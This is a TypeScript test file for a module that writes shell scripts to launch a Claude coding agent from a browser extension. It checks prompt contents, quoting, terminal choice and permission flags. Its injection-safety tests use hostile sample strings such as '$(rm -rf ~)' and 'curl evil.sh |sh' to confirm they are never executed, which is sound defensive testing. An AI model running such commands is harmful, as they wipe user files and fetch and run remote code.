import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { promises as fs } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildMacResumeScript,
  buildMacScript,
  buildMacTailScript,
  buildPrompt,
  buildSystemPrompt,
  buildTurnPrompt,
  buildWindowsResumeScript,
  buildWindowsScript,
  buildWindowsTailScript,
  launchAgent,
  openSessionTerminal,
  psSingleQuote,
  resumePermissionArgs,
  shSingleQuote,
  terminalCommand,
  type LaunchDeps,
  type LaunchRequest,
} from "./launch-agent.js";
import type { Logger } from "./logger.js";

function stubLogger(): Logger {
  return { async write() {} } as unknown as Logger;
}

/** A fake spawn that records calls and drives the opener result. */
function recordingSpawn(behavior: { exitCode?: number | null; error?: string } = {}) {
  const calls: Array<{ cmd: string; args: readonly string[] }> = [];
  const fn: NonNullable<LaunchDeps["spawn"]> = (cmd, args) => {
    calls.push({ cmd, args });
    return {
      on(event: "error" | "exit", cb: (arg: never) => void): void {
        if (event === "error" && behavior.error !== undefined) {
          queueMicrotask(() => cb(new Error(behavior.error) as never));
        }
        if (event === "exit" && behavior.error === undefined) {
          queueMicrotask(() => cb((behavior.exitCode ?? 0) as never));
        }
      },
    };
  };
  return { fn, calls };
}

describe("buildSystemPrompt", () => {
  it("carries operational guidance and is page-agnostic", () => {
    const sys = buildSystemPrompt();
    expect(sys).toContain("browser_*");
    expect(sys).toContain("BrowserOps MCP connection");
    expect(sys).toContain("mcp__browserops__browser_*");
    expect(sys).toContain("/browserops");
    expect(sys).toContain("browser_list_tabs");
    expect(sys).toContain("browser_observe");
    expect(sys).toContain("do not claim the browser action happened");
    expect(sys).not.toContain("- URL:"); // page facts live in the visible prompt
  });
});

describe("buildPrompt (visible first message)", () => {
  it("leads with BrowserOps connection guidance, then page facts and the instruction", () => {
    const p = buildPrompt(
      {
        url: "https://example.com/a",
        title: "Example",
        description: "An example page",
        siteName: "Example Inc",
      },
      "summarize this",
    );
    expect(p).toContain("BrowserOps browser connection:");
    expect(p).toContain("live Chrome profile");
    expect(p).toContain("mcp__browserops__browser_*");
    expect(p.indexOf("BrowserOps browser connection:")).toBeLessThan(
      p.indexOf("Current page when I launched you:"),
    );
    expect(p).toContain("Current page when I launched you:");
    expect(p).toContain("- URL: https://example.com/a");
    expect(p).toContain("- Title: Example");
    expect(p).toContain("- Description: An example page");
    expect(p).toContain("- Site: Example Inc");
    expect(p.endsWith("summarize this")).toBe(true);
  });

  it("is just the page facts when there is no instruction", () => {
    const p = buildPrompt({ url: "" });
    expect(p).toContain("- URL: (unknown)");
    expect(p).not.toContain("- Title:");
    expect(p.trim().endsWith("(unknown)")).toBe(true);
  });
});

describe("buildTurnPrompt (provider follow-up envelope)", () => {
  it("repeats BrowserOps' live-page contract without changing the canonical panel turn", () => {
    const p = buildTurnPrompt(
      { url: "https://mail.example/inbox", title: "Inbox" },
      "Read my last email.",
    );
    expect(p).toContain("BrowserOps browser connection:");
    expect(p).toContain("Current page for this message:");
    expect(p).toContain("- URL: https://mail.example/inbox");
    expect(p).toContain("User request:\nRead my last email.");
  });
});

describe("shell quoting", () => {
  it("single-quotes for bash, escaping embedded single quotes", () => {
    expect(shSingleQuote("/tmp/abc.command")).toBe("'/tmp/abc.command'");
    expect(shSingleQuote("a'b")).toBe(`'a'\\''b'`);
  });

  it("single-quotes for PowerShell, doubling embedded single quotes", () => {
    expect(psSingleQuote("C:\\x.ps1")).toBe("'C:\\x.ps1'");
    expect(psSingleQuote("a'b")).toBe("'a''b'");
  });
});

describe("buildMacScript", () => {
  const base = {
    sysPath: "/d/x.sys",
    promptPath: "/d/x.prompt",
    scriptPath: "/d/x.command",
    binary: "claude",
    execArgs: '--dangerously-skip-permissions --append-system-prompt "$SYS"',
  };

  it("reads sys + prompt, self-deletes all three, and execs with the visible prompt", () => {
    const s = buildMacScript(base);
    expect(s).toContain("SYS=\"$(cat '/d/x.sys' 2>/dev/null)\"");
    expect(s).toContain("PROMPT=\"$(cat '/d/x.prompt' 2>/dev/null)\"");
    expect(s).toContain("rm -f '/d/x.sys' '/d/x.prompt' '/d/x.command'");
    expect(s).toContain("command -v claude");
    expect(s).toContain(
      'exec claude --dangerously-skip-permissions --append-system-prompt "$SYS" "$PROMPT"',
    );
    expect(s.startsWith("#!/bin/bash")).toBe(true);
  });
});

describe("buildWindowsScript", () => {
  const base = {
    sysPath: "C:\\d\\x.sys",
    promptPath: "C:\\d\\x.prompt",
    scriptPath: "C:\\d\\x.ps1",
    binary: "claude",
    execArgs: "--dangerously-skip-permissions --append-system-prompt $sys",
  };

  it("reads sys + prompt, self-deletes, and runs the agent with CRLF endings", () => {
    const s = buildWindowsScript(base);
    expect(s).toContain("$sys = Get-Content -Raw -Path 'C:\\d\\x.sys'");
    expect(s).toContain("$prompt = Get-Content -Raw -Path 'C:\\d\\x.prompt'");
    expect(s).toContain(
      "Remove-Item -Force -Path 'C:\\d\\x.sys', 'C:\\d\\x.prompt', 'C:\\d\\x.ps1'",
    );
    expect(s).toContain("Get-Command claude");
    expect(s).toContain(
      "claude --dangerously-skip-permissions --append-system-prompt $sys $prompt",
    );
    expect(s).toContain("\r\n");
  });
});

describe("terminalCommand", () => {
  it("opens Terminal.app on macOS, iTerm when present", () => {
    expect(terminalCommand("darwin", "/d/x.command", {})).toEqual({
      cmd: "open",
      args: ["-a", "Terminal", "/d/x.command"],
    });
    expect(terminalCommand("darwin", "/d/x.command", { iTerm: true })).toEqual({
      cmd: "open",
      args: ["-a", "iTerm", "/d/x.command"],
    });
  });

  it("prefers Windows Terminal, falls back to cmd start", () => {
    expect(terminalCommand("win32", "C:\\x.ps1", { windowsTerminal: true })?.cmd).toBe("wt.exe");
    expect(terminalCommand("win32", "C:\\x.ps1", { windowsTerminal: false })?.cmd).toBe("cmd.exe");
  });

  it("returns null for unsupported platforms", () => {
    expect(terminalCommand("linux", "/d/x.sh", {})).toBeNull();
  });
});

describe("launchAgent", () => {
  let dir: string;

  beforeEach(async () => {
    dir = await fs.mkdtemp(join(tmpdir(), "browserops-launch-"));
  });
  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  function deps(over: Partial<LaunchDeps> = {}): {
    deps: LaunchDeps;
    calls: ReturnType<typeof recordingSpawn>["calls"];
  } {
    const spawn = recordingSpawn();
    const d: LaunchDeps = {
      platform: "darwin",
      dir,
      safeMode: async () => false,
      iTermInstalled: async () => false,
      windowsTerminalAvailable: async () => false,
      randomId: () => "fixed123",
      spawn: spawn.fn,
      ...over,
    };
    return { deps: d, calls: spawn.calls };
  }

  const claudeReq = (over: Partial<LaunchRequest> = {}): LaunchRequest => ({
    agent: "claude",
    page: { url: "https://x.test", title: "T" },
    ...over,
  });

  it("writes sys + a visible prompt (page + instruction) + .command and opens Terminal", async () => {
    const { deps: d, calls } = deps();
    const res = await launchAgent(claudeReq({ instruction: "do the thing" }), stubLogger(), d);
    expect(res).toEqual({ ok: true });

    const sys = await fs.readFile(join(dir, "fixed123.sys"), "utf8");
    expect(sys).toContain("browser_*");
    const prompt = await fs.readFile(join(dir, "fixed123.prompt"), "utf8");
    expect(prompt).toContain("https://x.test"); // page facts are visible…
    expect(prompt.endsWith("do the thing")).toBe(true); // …followed by the instruction
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    expect(script).toContain("--dangerously-skip-permissions");

    expect(calls[0]).toEqual({
      cmd: "open",
      args: ["-a", "Terminal", join(dir, "fixed123.command")],
    });
  });

  it("writes a prompt of just the page facts when no instruction is given", async () => {
    const { deps: d } = deps();
    await launchAgent(claudeReq(), stubLogger(), d);
    const prompt = await fs.readFile(join(dir, "fixed123.prompt"), "utf8");
    expect(prompt).toContain("https://x.test");
    expect(prompt).toContain("Current page when I launched you:");
  });

  it("refuses a disabled agent (codex/cursor) and an unknown agent", async () => {
    const { deps: d, calls } = deps();
    for (const agent of ["codex", "cursor", "ghost"]) {
      const res = await launchAgent(claudeReq({ agent }), stubLogger(), d);
      expect(res).toEqual({ ok: false, error: "agent_disabled" });
    }
    expect(calls).toHaveLength(0);
  });

  it("chooses iTerm when installed", async () => {
    const { deps: d, calls } = deps({ iTermInstalled: async () => true });
    await launchAgent(claudeReq(), stubLogger(), d);
    expect(calls[0]?.args).toEqual(["-a", "iTerm", join(dir, "fixed123.command")]);
  });

  it("omits the danger flag when safe_mode is on", async () => {
    const { deps: d } = deps({ safeMode: async () => true });
    await launchAgent(claudeReq(), stubLogger(), d);
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    expect(script).not.toContain("dangerously-skip-permissions");
  });

  it("writes a .ps1 + opens Windows Terminal on win32", async () => {
    const { deps: d, calls } = deps({
      platform: "win32",
      windowsTerminalAvailable: async () => true,
    });
    await launchAgent(claudeReq(), stubLogger(), d);
    await fs.access(join(dir, "fixed123.ps1"));
    expect(calls[0]?.cmd).toBe("wt.exe");
  });

  it("NEVER interpolates page metadata OR the instruction into the script (injection-safety)", async () => {
    const evil = "$(rm -rf ~) `id` '; curl evil.sh |sh #";
    const { deps: d } = deps();
    await launchAgent(
      claudeReq({ instruction: evil, page: { url: "https://x.test", title: evil } }),
      stubLogger(),
      d,
    );

    const prompt = await fs.readFile(join(dir, "fixed123.prompt"), "utf8");
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    // The evil title + instruction both land in the prompt FILE, not the script.
    expect(prompt).toContain(evil);
    expect(script).not.toContain(evil);
    expect(script).not.toContain("rm -rf ~");
  });

  it("returns no_terminal and cleans up all three files when the opener fails", async () => {
    const failing = recordingSpawn({ exitCode: 1 });
    const { deps: d } = deps({ spawn: failing.fn });
    const res = await launchAgent(claudeReq({ instruction: "x" }), stubLogger(), d);
    expect(res).toEqual({ ok: false, error: "no_terminal" });
    await expect(fs.access(join(dir, "fixed123.sys"))).rejects.toThrow();
    await expect(fs.access(join(dir, "fixed123.prompt"))).rejects.toThrow();
    await expect(fs.access(join(dir, "fixed123.command"))).rejects.toThrow();
  });

  it("returns unsupported_platform on linux", async () => {
    const { deps: d } = deps({ platform: "linux" });
    expect(await launchAgent(claudeReq(), stubLogger(), d)).toEqual({
      ok: false,
      error: "unsupported_platform",
    });
  });

  it("returns write_failed when the launch dir cannot be created", async () => {
    const fileAsParent = join(dir, "afile");
    await fs.writeFile(fileAsParent, "x");
    const { deps: d } = deps({ dir: join(fileAsParent, "sub") });
    expect(await launchAgent(claudeReq(), stubLogger(), d)).toEqual({
      ok: false,
      error: "write_failed",
    });
  });
});

describe("session terminal scripts", () => {
  it("macOS mirror tails the log with -F and self-deletes", () => {
    const s = buildMacTailScript("/c/sess.mirror.log", "/d/x.command");
    expect(s.startsWith("#!/bin/bash")).toBe(true);
    expect(s).toContain("tail -n +1 -F '/c/sess.mirror.log'");
    expect(s).toContain("rm -f '/d/x.command'");
  });

  it("Windows mirror follows the log (creating it if absent), CRLF", () => {
    const s = buildWindowsTailScript("C:\\c\\sess.log", "C:\\d\\x.ps1");
    expect(s).toContain("Get-Content -Wait -Path 'C:\\c\\sess.log'");
    expect(s).toContain("New-Item -ItemType File -Force -Path 'C:\\c\\sess.log'");
    expect(s).toContain("\r\n");
  });

  it("resumePermissionArgs is interactive, never skip-permissions", () => {
    expect(resumePermissionArgs(false)).toBe(
      "--permission-mode acceptEdits --allowedTools mcp__browserops",
    );
    expect(resumePermissionArgs(true)).toBe("--permission-mode default");
    expect(resumePermissionArgs(false)).not.toContain("dangerously-skip-permissions");
  });

  it("macOS takeover resumes with interactive permission flags (never skip-permissions)", () => {
    const normal = buildMacResumeScript({
      sessionId: "sess-123",
      cwd: "/work",
      permissionArgs: resumePermissionArgs(false),
      binary: "claude",
      scriptPath: "/d/x.command",
    });
    expect(normal).toContain("cd '/work'");
    expect(normal).toContain("command -v claude");
    expect(normal).toContain(
      "exec env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CLAUDE_CODE_SESSION_ID -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_EFFORT claude --permission-mode acceptEdits --allowedTools mcp__browserops --resume 'sess-123'",
    );
    expect(normal).not.toContain("dangerously-skip-permissions");

    const safe = buildMacResumeScript({
      sessionId: "sess-123",
      cwd: "/work",
      permissionArgs: resumePermissionArgs(true),
      binary: "claude",
      scriptPath: "/d/x.command",
    });
    expect(safe).toContain(
      "exec env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CLAUDE_CODE_SESSION_ID -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_EFFORT claude --permission-mode default --resume 'sess-123'",
    );
    expect(safe).not.toContain("dangerously-skip-permissions");
  });

  it("Windows takeover resumes with interactive permission flags, CRLF", () => {
    const s = buildWindowsResumeScript({
      sessionId: "sess-123",
      cwd: "C:\\work",
      permissionArgs: resumePermissionArgs(false),
      binary: "claude",
      scriptPath: "C:\\d\\x.ps1",
    });
    expect(s).toContain(
      "claude --permission-mode acceptEdits --allowedTools mcp__browserops --resume 'sess-123'",
    );
    expect(s).not.toContain("dangerously-skip-permissions");
    expect(s).toContain("Set-Location -Path 'C:\\work'");
    expect(s).toContain("\r\n");
  });

  it("a cwd containing shell metacharacters is single-quoted, never executed", () => {
    const evil = "/work'; $(touch PWNED) #";
    const s = buildMacResumeScript({
      sessionId: "s",
      cwd: evil,
      permissionArgs: resumePermissionArgs(true),
      binary: "claude",
      scriptPath: "/d/x.command",
    });
    // The cwd lands inside a single-quoted cd, with the embedded quote escaped.
    expect(s).toContain(`cd ${shSingleQuote(evil)}`);
    expect(s).not.toContain("cd /work'; $(touch PWNED)");
  });
});

describe("openSessionTerminal", () => {
  let dir: string;
  beforeEach(async () => {
    dir = await fs.mkdtemp(join(tmpdir(), "browserops-term-"));
  });
  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  function deps(over: Partial<LaunchDeps> = {}): {
    deps: LaunchDeps;
    calls: ReturnType<typeof recordingSpawn>["calls"];
  } {
    const spawn = recordingSpawn();
    const d: LaunchDeps = {
      platform: "darwin",
      dir,
      safeMode: async () => false,
      iTermInstalled: async () => false,
      windowsTerminalAvailable: async () => false,
      randomId: () => "term1",
      spawn: spawn.fn,
      ...over,
    };
    return { deps: d, calls: spawn.calls };
  }

  it("mirror: writes a tail .command and opens Terminal", async () => {
    const { deps: d, calls } = deps();
    const res = await openSessionTerminal(
      { mode: "mirror", sessionId: "s1", cwd: "/work", mirrorPath: "/c/s1.mirror.log" },
      stubLogger(),
      d,
    );
    expect(res).toEqual({ ok: true });
    const script = await fs.readFile(join(dir, "term1.command"), "utf8");
    expect(script).toContain("tail -n +1 -F '/c/s1.mirror.log'");
    expect(calls[0]).toEqual({ cmd: "open", args: ["-a", "Terminal", join(dir, "term1.command")] });
  });

  it("takeover: writes a resume .command with interactive flags (never skip-permissions)", async () => {
    const { deps: d } = deps();
    await openSessionTerminal(
      { mode: "takeover", sessionId: "s1", cwd: "/work", mirrorPath: "/c/s1.mirror.log" },
      stubLogger(),
      d,
    );
    const script = await fs.readFile(join(dir, "term1.command"), "utf8");
    expect(script).toContain("--resume 's1'");
    expect(script).toContain("--permission-mode acceptEdits --allowedTools mcp__browserops");
    expect(script).not.toContain("dangerously-skip-permissions");
  });

  it("writes a .ps1 + opens Windows Terminal on win32", async () => {
    const { deps: d, calls } = deps({
      platform: "win32",
      windowsTerminalAvailable: async () => true,
    });
    await openSessionTerminal(
      { mode: "mirror", sessionId: "s1", cwd: "C:\\work", mirrorPath: "C:\\c\\s1.log" },
      stubLogger(),
      d,
    );
    await fs.access(join(dir, "term1.ps1"));
    expect(calls[0]?.cmd).toBe("wt.exe");
  });

  it("returns unsupported_platform on linux", async () => {
    const { deps: d } = deps({ platform: "linux" });
    expect(
      await openSessionTerminal(
        { mode: "mirror", sessionId: "s1", cwd: "/w", mirrorPath: "/c/s1.log" },
        stubLogger(),
        d,
      ),
    ).toEqual({ ok: false, error: "unsupported_platform" });
  });

  it("returns no_terminal and cleans up when the opener fails", async () => {
    const failing = recordingSpawn({ exitCode: 1 });
    const { deps: d } = deps({ spawn: failing.fn });
    const res = await openSessionTerminal(
      { mode: "mirror", sessionId: "s1", cwd: "/w", mirrorPath: "/c/s1.log" },
      stubLogger(),
      d,
    );
    expect(res).toEqual({ ok: false, error: "no_terminal" });
    await expect(fs.access(join(dir, "term1.command"))).rejects.toThrow();
  });
});
